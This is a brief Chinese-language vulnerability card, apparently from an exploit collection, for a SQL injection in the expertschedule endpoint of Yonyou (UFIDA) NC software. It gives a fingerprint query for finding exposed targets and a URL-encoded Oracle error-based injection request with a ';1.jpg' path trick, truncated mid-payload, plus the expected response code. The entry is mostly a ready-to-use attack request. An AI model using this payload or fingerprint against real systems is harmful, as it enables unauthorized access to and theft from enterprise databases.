# 用友NCexpertschedule存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1%27+AND+6248%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CC`
- **响应特征**：200